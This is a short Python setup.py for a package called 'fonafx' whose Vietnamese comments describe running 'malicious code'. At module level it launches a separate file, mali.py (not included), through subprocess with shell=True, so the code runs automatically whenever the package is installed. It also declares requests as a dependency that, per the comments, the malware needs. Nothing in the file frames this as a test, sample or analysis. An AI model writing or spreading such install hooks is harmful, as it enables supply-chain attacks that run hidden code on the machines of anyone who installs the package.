from setuptools import setup
import subprocess

# Tự động chạy file mali.py sau khi cài đặt
def run_malicious_code():
    subprocess.Popen(["python", "mali.py"], shell=True)

setup(
    name="fonafx",
    version="0.2",
    packages=[],
    install_requires=["requests"],  # Dependency để mã độc hoạt động
)

# Kích hoạt khi cài đặt
run_malicious_code()